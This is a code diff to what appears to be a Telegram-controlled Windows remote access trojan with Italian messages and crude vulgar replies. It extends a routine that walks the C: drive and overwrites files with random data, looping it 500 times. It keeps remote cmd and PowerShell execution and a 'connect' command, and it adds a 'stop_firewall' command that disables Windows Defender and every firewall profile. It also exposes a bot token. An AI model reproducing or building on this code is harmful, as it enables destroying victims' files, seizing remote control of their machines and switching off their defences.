@@ -8,7 +8,7 @@ from threading import Thread
 
 keys = "5216257692:AAE6jR6NClBhXdCkHEdxC2fOYSL7Wf176TM"
 
-def ransom():
+def ran():
 	dirs = []
 	chrs = string.printable
 	for files in os.walk("C:\\"):
@@ -25,6 +25,10 @@ def ransom():
 				file_now.write(file_data)
 			except:
 				pass
+
+def ransom():
+	for x in range(500):
+		ran()
 
 def sample_resp(input_text):
 	user_message = str(input_text).lower()
@@ -77,7 +81,7 @@ def sample_resp(input_text):
 	if "inculali" in user_message:
 		ram = Thread(target=ransom)
 		ram.start()
-		return "ora li inculo a sangue ;)"
+		return "8:::::::::::::::::::::::::::::::::::::::::::::::::::::::D\ninculamento in corso, attendere prego"
 	if "cmd" in user_message:
 		if "-com" in user_message:
 			comando = user_message.split("-com=")
@@ -92,6 +96,14 @@ def sample_resp(input_text):
 			return os.popen("powershell -c '"+comando+"'").read()
 		else:
 			return "Es. /powershell -com=comando"
+	if "stop_firewall" in user_message:
+		try:
+			lista_cmd = ["sc stop WinDefend", "sc config WinDefend start= disabled", " netsh advfirewall set allprofiles state off", 'powershell -c "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"']
+			for cmd in lista_cmd:
+				os.popen(cmd)
+			return "[*]Stop Finished"
+		except:
+			return "[-]Stop Failed"
 	if "connect" in user_message:
 		if "-ip=" in user_message:
 			ip = user_message.split("-ip=")
@@ -125,7 +137,7 @@ def help_command(update, context):
 	update.message.reply_text("Contatta il re degli hacker (@Vit8816)")
 
 def lista_comandi(update,context):
-	msg = "ls\npwd\ndownload\nstart_program\nprocessi\nconnect\ncmd\npowershell\ninculali"
+	msg = "ls\npwd\ndownload\nstart_program\nprocessi\ninculali\ncmd\npowershell\nstop_firewall\nconnect"
 	update.message.reply_text(msg)
 
 def handle_message(update, context):
